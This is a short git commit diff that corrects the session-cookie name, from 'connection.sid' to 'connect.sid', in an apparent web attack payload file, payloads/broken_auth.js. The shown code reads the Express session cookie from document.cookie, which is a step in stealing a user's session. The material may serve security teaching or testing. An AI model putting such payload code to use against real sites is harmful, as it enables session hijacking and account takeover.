ecfb4396b6de77a6c1e9e54e21250e282e616152
Sam Chaara <Sam.R.Chaara@gmail.com>
2020-08-10 16:06:42 -0500

    connect.sid, not connection.sid

--- payloads/broken_auth.js
+++ payloads/broken_auth.js
@@ -1,5 +1,5 @@
 //Finding/Parsing cookies: https://developer.mozilla.org/en-US/docs/Web/API/Document/cookie
-const cookieName = "connection.sid";
+const cookieName = "connect.sid";
 const cookieValue = document.cookie
     .split("; ")
     .find((row) => row.startsWith(cookieName))
